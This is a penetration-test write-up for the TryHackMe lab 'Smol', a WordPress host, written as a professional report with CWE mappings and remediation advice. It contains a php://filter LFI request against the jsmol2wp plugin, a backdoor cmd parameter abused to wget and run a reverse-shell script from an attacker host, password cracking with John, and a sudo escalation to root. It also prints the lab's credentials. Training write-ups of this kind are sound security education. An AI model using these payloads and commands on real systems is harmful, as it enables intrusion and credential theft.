# Smol — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of **Smol**, a WordPress-based Linux host (TryHackMe), focusing on plugin security, credential management, and host privilege configuration.

## Scope of Work

**In-Scope Assets:**
- **Host:** `smol.thm`
- **Services:** SSH (OpenSSH 8.2p1), HTTP (Apache 2.4.41, WordPress)
- **Testing Perspective:** Unauthenticated external attacker

---

## Enumeration

### Port Scan (Rustscan + Nmap)

```
Port    Service     Version
22      SSH         OpenSSH 8.2p1
80      HTTP        Apache 2.4.41
```

### Web Enumeration

Directory brute-forcing identified a WordPress installation, including `/wp-admin`, `/wp-login.php`, `/wp-content/`, `xmlrpc.php`, and an accessible `wp-config.php`. Username enumeration via the WordPress JSON API and related techniques identified the users: `admin`, `wpuser`, `think`, `gege`, `diego`, `xavi`.

### Tools Used
- Rustscan / Nmap
- dirsearch
- WPScan techniques / WordPress JSON API
- John the Ripper (incl. zip2john)
- netcat, python http.server

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| SSRF/LFI in `jsmol2wp` Plugin Exposing `wp-config.php` | Critical | Database and WordPress administrator credential disclosure |
| Authenticated RCE via Hello Dolly Plugin Backdoor | Critical | Remote code execution as web service user |
| Sensitive Backup Archive Exposing Reusable Credentials | Medium | Credential reuse enabling lateral movement to SSH |
| Sudo Misconfiguration — Unrestricted `sudo` Access | Critical | Full root privilege escalation |

---

### SSRF/LFI in `jsmol2wp` Plugin Exposing `wp-config.php`

#### Severity
Critical

#### CWE
- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program

#### OWASP Category
OWASP Top 10 2021 – A03: Injection (Outdated/Vulnerable Component)

#### Description
The site runs the `jsmol2wp` plugin (version ≤ 1.07), which contains a known vulnerability in `jsmol.php` allowing the `getRawDataFromDatabase` action to fetch arbitrary local resources via a `query` parameter using the `php://filter` wrapper. This was used to read the contents of `wp-config.php`, exposing the WordPress database credentials.

#### Affected Functionality
- `/wp-content/plugins/jsmol2wp/php/jsmol.php`

#### Steps to Reproduce
1. Identify the installed `jsmol2wp` plugin and confirm it is at a vulnerable version (≤ 1.07).
2. Request the vulnerable endpoint with a `php://filter` payload targeting `wp-config.php`:
   ```
   GET /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
   ```
3. Review the response for the base64/raw contents of `wp-config.php`.

#### Proof of Concept
The request returned the full contents of `wp-config.php`, including:
```
DB_USER: wpuser
DB_PASSWORD: kbLSF2Vop#lw3rjDZ629*Z%G
```
These credentials were valid for authenticating to the WordPress admin panel at `/wp-admin`.

#### Impact
- Disclosure of database credentials, which also functioned as valid WordPress administrator credentials
- Provided authenticated access to the WordPress admin panel, the precondition for the RCE finding below

#### Root Cause
Use of an outdated, vulnerable third-party plugin that exposes a file-read primitive via `php://filter` to unauthenticated users, with no patching or vulnerability management process in place for installed plugins.

#### Recommendation
- Update or remove the `jsmol2wp` plugin to a patched version
- Implement a process for tracking and patching third-party WordPress plugins against known CVEs
- Store database credentials such that compromise of `wp-config.php` does not directly yield administrative web application access (e.g. unique admin credentials, not shared with DB credentials)
- Restrict use of PHP stream wrappers (`php://filter`, etc.) in plugin code accepting user input

#### References
- OWASP Top 10 2021 – A03: Injection
- CWE-918, CWE-98

---

### Authenticated Remote Code Execution via Hello Dolly Plugin Backdoor

#### Severity
Critical

#### CWE
CWE-94: Improper Control of Generation of Code ('Code Injection')

#### OWASP Category
OWASP Top 10 2021 – A03: Injection

#### Description
After authenticating to the WordPress admin panel using the credentials recovered above, the installed "Hello Dolly" plugin was found to contain a backdoor accepting a `cmd` GET parameter and executing it as an OS command, returning the output directly in the response. This was used to confirm command execution and subsequently to retrieve and execute a reverse shell script.

#### Affected Functionality
- `/wp-admin/index.php?cmd=`

#### Steps to Reproduce
1. Log in to `/wp-admin` using the credentials recovered from `wp-config.php`.
2. Confirm command execution via the backdoored plugin:
   ```
   GET /wp-admin/index.php?cmd=whoami
   ```
   Response: `www-data`
3. Host a reverse shell script (`smolshell.sh`) on an attacker-controlled web server and start a netcat listener.
4. Use the `cmd` parameter to download, set permissions on, and execute the shell script:
   ```
   /wp-admin/index.php?cmd=wget http://<attacker_ip>:8000/smolshell.sh
   /wp-admin/index.php?cmd=chmod 777 smolshell.sh
   /wp-admin/index.php?cmd=bash smolshell.sh
   ```

#### Proof of Concept
The `?cmd=whoami` request returned `www-data`, confirming arbitrary OS command execution. The subsequent download-and-execute sequence resulted in an interactive reverse shell as `www-data` on the attacker's listener.

#### Impact
- Full remote code execution as the web server user
- Enables filesystem access for credential dumping and discovery of further sensitive files (see next finding)

#### Root Cause
A plugin present in the WordPress installation contains a deliberately or accidentally introduced backdoor that executes arbitrary OS commands from an unauthenticated request parameter, reachable by any user with admin-panel access.

#### Recommendation
- Audit all installed plugins for unauthorized modifications or backdoors, especially plugins that are commonly bundled by default (e.g. Hello Dolly)
- Remove unused or non-essential plugins entirely
- Implement file-integrity monitoring on the WordPress installation to detect unauthorized code changes
- Run the web server process with least-privilege, restricting filesystem access outside the web root

#### References
- OWASP Top 10 2021 – A03: Injection
- CWE-94

---

### Sensitive Backup Archive Exposing Reusable Credentials

#### Severity
Medium

#### CWE
- CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory
- CWE-312: Cleartext Storage of Sensitive Information

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
After dumping WordPress user credentials from the database and cracking a user hash (`diego`), lateral movement to the host filesystem revealed an SSH private key and access as `diego`/`think`. A backup archive, `wordpress.old.zip`, was found to be password-protected but crackable, and its contents revealed a password for the user `xavi` that had been reused from credentials extracted from `wp-config.php`. This password granted SSH access and was used in the final privilege escalation step.

#### Affected Functionality
- `wordpress.old.zip` (filesystem backup)
- SSH authentication for `xavi`

#### Steps to Reproduce
1. From the `www-data` shell, dump WordPress user table contents and crack extracted password hashes (e.g. using John against `rockyou.txt`), recovering `diego: sandiegocalifornia`.
2. Pivot to `diego`, then locate and use an SSH private key found under `/home/think/.ssh/id_rsa` to SSH in as `think`.
3. Locate `wordpress.old.zip`, transfer it to the attacker machine, and crack its password:
   ```bash
   zip2john wordpress.old.zip > wp_hash.txt
   john wp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```
4. Extract the archive and identify a credential for `xavi` matching a value previously seen in `wp-config.php`.

#### Proof of Concept
The cracked archive contained the credential `xavi: P@ssw0rdxavi@`, which was valid for SSH authentication as `xavi` and was directly tied to the privilege escalation finding below.

#### Impact
- Provided valid credentials for a user account (`xavi`) with significantly elevated privileges (see next finding)
- Demonstrates that credential reuse between application configuration and backup archives created a direct path to full compromise

#### Root Cause
A backup of the WordPress installation, including configuration data containing credentials, was left on the filesystem accessible to a non-administrative user, and the credentials within were reused for an OS-level account.

#### Recommendation
- Do not store backups containing credentials in locations accessible to application or low-privilege accounts
- Use strong, unique passwords for backup archive encryption — avoid passwords present in common wordlists
- Eliminate credential reuse between application configuration, backups, and OS-level accounts
- Regularly audit the filesystem for stale backup files and remove them once no longer needed

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-538, CWE-312

---

### Sudo Misconfiguration — Unrestricted `sudo` Access

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
The user `xavi`, whose credentials were recovered from the cracked backup archive, was configured with unrestricted `sudo` privileges (`(ALL : ALL) ALL`), allowing this account to execute any command as root without further restriction.

#### Affected Functionality
- `/etc/sudoers` configuration for user `xavi`

#### Steps to Reproduce
1. Authenticate as `xavi` (via SSH, using the credential recovered from `wordpress.old.zip`).
2. Run `sudo -l` to enumerate permitted commands:
   ```
   (ALL : ALL) ALL
   ```
3. Escalate directly to a root shell:
   ```bash
   sudo su
   cat /root/root.txt
   ```

#### Proof of Concept
Running `sudo su` as `xavi` succeeded without restriction, providing an interactive root shell and access to `/root/root.txt`.

#### Impact
- Complete compromise of the host with full root privileges
- Combined with the credential-reuse finding above, represents the final step in a full chain from unauthenticated web access to root

#### Root Cause
A user account was granted unrestricted `sudo` privileges with no business justification documented, and this account's credentials were also present in an accessible backup archive — combining a credential exposure issue with an excessive-privilege issue.

#### Recommendation
- Apply least privilege to `sudoers` entries — grant access only to the specific commands a user requires, not unrestricted `ALL`
- Regularly audit `/etc/sudoers` and `sudoers.d/` for overly permissive entries
- Ensure privilege grants are tied to documented business need and reviewed periodically
- Address the credential reuse issue (previous finding) to remove the path to this account

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-269

---

## Attack Chain Summary

1. Identified vulnerable `jsmol2wp` plugin (≤ 1.07) and exploited SSRF/LFI to read `wp-config.php`
2. Recovered database credentials that doubled as WordPress administrator credentials
3. Authenticated to `/wp-admin` and discovered a backdoor in the Hello Dolly plugin enabling OS command execution
4. Achieved a reverse shell as `www-data` via the plugin backdoor
5. Dumped and cracked WordPress user hashes, pivoting to `diego` and then `think` via an exposed SSH key
6. Recovered and cracked `wordpress.old.zip`, revealing reused credentials for `xavi`
7. Authenticated as `xavi` via SSH and exploited unrestricted `sudo` access to obtain a root shell

## Key Takeaways

- Outdated WordPress plugins remain a common and critical entry point — plugin patching must be part of routine maintenance
- Credential reuse between application configuration, backups, and OS accounts collapses otherwise-separate compromises into a single chain
- Backdoored or modified plugins can persist undetected without file-integrity monitoring
- Unrestricted `sudo` grants turn any credential compromise into full root compromise